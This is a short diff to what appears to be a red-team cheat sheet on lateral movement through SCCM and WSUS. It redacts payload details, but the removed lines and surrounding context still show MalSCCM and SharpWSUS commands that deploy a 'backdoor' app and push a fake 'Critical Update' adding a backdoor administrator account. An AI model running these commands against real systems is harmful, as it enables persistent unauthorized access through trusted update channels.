@@ -151,7 +151,7 @@ MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
 MalSCCM.exe group /addhost /groupname:TargetGroup /host:TARGET-PC
 
 # Create malicious app
-MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"
+MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\[REDACTED_MALICIOUS_PAYLOAD]"
 
 # Deploy
 MalSCCM.exe app /deploy /name:backdoor /groupname:TargetGroup /assignmentname:update
@@ -182,7 +182,7 @@ SharpWSUS.exe locate
 SharpWSUS.exe inspect
 
 # Create malicious update
-SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user backdoor Password123! /add\"" /title:"Critical Update"
+SharpWSUS.exe create /payload:"[REDACTED_PSEXEC_PAYLOAD]" /args:"-accepteula -s -d cmd.exe /c \"[REDACTED_BACKDOOR_PAYLOAD]\"" /title:"Critical Update"
 
 # Deploy to target
 SharpWSUS.exe approve /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"
